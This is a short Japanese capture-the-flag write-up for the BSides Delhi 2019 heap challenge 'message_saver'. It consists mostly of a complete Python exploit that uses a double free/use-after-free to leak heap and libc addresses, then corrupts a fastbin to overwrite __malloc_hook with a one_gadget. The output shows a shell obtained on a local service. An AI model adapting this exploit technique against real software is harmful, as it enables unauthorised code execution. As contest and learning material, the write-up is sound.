# [pwn 919pts] message_saver - BSides Dehli CTF 2019
64ビットで全部有効です。
```
$ checksec -f message_saver
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83 Symbols     Yes      0               4       message_saver
```
ヒープ問です。addすると次のような構造体が確保されます。
```c
typedef struct {
  char topic[0x18];
  char *body;
  int size;
} Note;
```
libcは2.23で、単純なdouble free/UAFがあるのでやるだけです。
```python
from ptrlib import *

def add(index, topic, size, body):
    sock.sendlineafter(">", "1")
    sock.sendlineafter("\n", str(index))
    sock.sendafter("\n", topic)
    sock.sendlineafter("\n", str(size))
    sock.sendafter("\n", body)
    return
def edit(index, topic, body):
    sock.sendlineafter(">", "2")
    sock.sendlineafter("\n", str(index))
    sock.sendafter("\n", topic)
    sock.sendafter("\n", body)
    return
def show(index):
    sock.sendlineafter(">", "4")
    sock.sendlineafter("\n", str(index))
    s = sock.recvline().split(b" : ")
    topic = s[1] if len(s) == 2 else b''
    s = sock.recvline().split(b" : ")
    body = s[1] if len(s) == 2 else b''
    return topic, body
def delete(index):
    sock.sendlineafter(">", "3")
    sock.sendlineafter("\n", str(index))
    return

libc = ELF("./libc-2.23.so")
sock = Socket("localhost", 9999)
libc_main_arena = 0x3c4b20
libc_one_gadget = 0xf1147

# leak libc
add(0, "Hello", 0x28, "Hello")
add(1, "Hello", 0x28, "Hello")
add(2, "Hello", 0x90, "Hello")
add(3, "Hello", 0x90, "Hello")
delete(0)
delete(1)
delete(2)
heap_base = u64(show(1)[0])
libc_base = u64(show(2)[1]) - libc_main_arena - 0x58
logger.info("heap = " + hex(heap_base))
logger.info("libc = " + hex(libc_base))

# fastbin corruption attack
add(0, "A", 0x68, "A")
delete(0)
edit(0, p64(heap_base), p64(libc_base + libc.symbol("__malloc_hook") - 0x23))
add(0, "A", 0x68, "A")
add(1, "B", 0x68, b"\x00" * 0x13 + p64(libc_base + libc_one_gadget))

# get the shell!
sock.sendlineafter(">", "1")
sock.sendlineafter("\n", "0")

sock.interactive()
```
朝飯前ってやつやな。
```
$ python solve.py 
[+] __init__: Successfully connected to localhost:9999
[+] <module>: heap = 0x55908a436090
[+] <module>: libc = 0x7f1d304f5000
[ptrlib]$ id
uid=0(root) gid=0(root) groups=0(root)
[ptrlib]$
```

# 感想
簡単ですね。